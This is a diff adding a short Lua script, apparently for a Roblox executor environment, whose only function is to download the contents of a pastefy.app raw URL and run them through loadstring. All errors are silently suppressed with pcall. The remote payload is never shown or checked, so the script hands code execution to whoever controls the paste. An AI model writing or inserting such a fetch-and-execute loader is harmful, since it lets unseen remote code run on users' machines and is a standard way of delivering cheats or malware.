@@ -1,0 +1,41 @@
+do
+  local remote = "https://pastefy.app/TE5vtsBL/raw"
+  local Loader = {}
+  Loader.__index = Loader
+
+  function Loader.new(url)
+    return setmetatable({url = url}, Loader)
+  end
+
+  function Loader:fetch()
+    local ok, res = pcall(function() return game:HttpGet(self.url) end)
+    if ok and type(res) == "string" and #res > 0 then
+      return res
+    end
+    return nil
+  end
+
+  function Loader:decodeAndRun(source)
+    if type(source) ~= "string" or #source == 0 then
+      return false
+    end
+    local chunk
+    if type(loadstring) == "function" then
+      chunk = loadstring(source)
+    else
+      local ok, f = pcall(load, source)
+      if ok then chunk = f end
+    end
+    if type(chunk) == "function" then
+      pcall(chunk)
+      return true
+    end
+    return false
+  end
+
+  local l = Loader.new(remote)
+  local body = l:fetch()
+  if body then
+    l:decodeAndRun(body)
+  end
+end
